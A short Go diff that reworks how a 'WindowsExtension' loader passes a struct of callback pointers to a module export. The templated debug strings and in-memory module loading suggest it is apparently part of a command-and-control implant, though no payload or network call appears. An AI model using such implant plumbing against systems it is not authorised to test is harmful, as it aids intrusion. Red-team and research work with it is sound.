@@ -45,6 +45,12 @@ type WindowsExtension struct {
 	sync.Mutex
 }
 
+type Callbacks struct {
+	sendData  uintptr
+	onFinish  uintptr
+	sendError uintptr
+}
+
 // NewWindowsExtension - Load a new windows extension
 func NewWindowsExtension(data []byte, id string, arch string, init string) *WindowsExtension {
 	return &WindowsExtension{
@@ -96,11 +102,15 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 	var (
 		argumentsPtr  uintptr
 		argumentsSize uintptr
+		callbacksPtr  uintptr
+		callbacks     Callbacks
 	)
 	if w.module == nil {
 		return errors.New("{{if .Config.Debug}} module not loaded {{end}}")
 	}
-	callback := syscall.NewCallback(newWindowsExtensionCallback(onFinish))
+	callbacks.onFinish = syscall.NewCallback(newWindowsExtensionCallback(onFinish))
+	callbacksPtr = uintptr(unsafe.Pointer(&callbacks))
+
 	exportPtr, err := w.module.ProcAddressByName(export)
 	if err != nil {
 		return err
@@ -117,7 +127,7 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 	// where goCallback = int(char *, int)
 	w.Lock()
 	defer w.Unlock()
-	_, _, errNo := syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, callback)
+	_, _, errNo := syscall.Syscall(exportPtr, 3, argumentsPtr, argumentsSize, callbacksPtr)
 	if errNo != 0 {
 		return errors.New(errNo.Error())
 	}
